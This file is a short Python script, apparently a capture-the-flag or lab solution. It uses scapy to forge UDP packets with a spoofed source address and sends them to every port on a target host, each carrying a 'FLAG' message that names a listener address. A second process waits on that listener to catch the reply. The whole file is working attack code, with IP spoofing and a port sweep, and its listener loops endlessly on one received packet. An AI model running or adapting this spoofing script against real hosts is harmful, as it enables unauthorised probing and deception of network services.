from scapy.all import UDP, Raw, IP, send
from multiprocessing import Process
import socket, time

def listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("10.0.0.1", 3000))
    print("start lestinig...")
    packet = s.recvfrom(1024)
    while True:
        print(packet)
    print("Done!")

def forger():
    # time.sleep(5)
    port = 1
    while True:
        ip = IP(src="10.0.0.3", dst="10.0.0.2")
        udp = UDP(sport=31337, dport=port)
        data = Raw(load=b"FLAG:10.0.0.1:3000")
        msg = ip / udp / data
        # i = 1
        # while i < 10:
        send(msg, verbose=False)
            # time.sleep(0.01)
            # i += 1
        # time.sleep(0.1)
        port += 1
        print("port =", port)
        if port == 65535:
            port = 0
    

p1 = Process(target=listener)
p2 = Process(target=forger)
p1.start()
p2.start()
p1.join()
p2.join()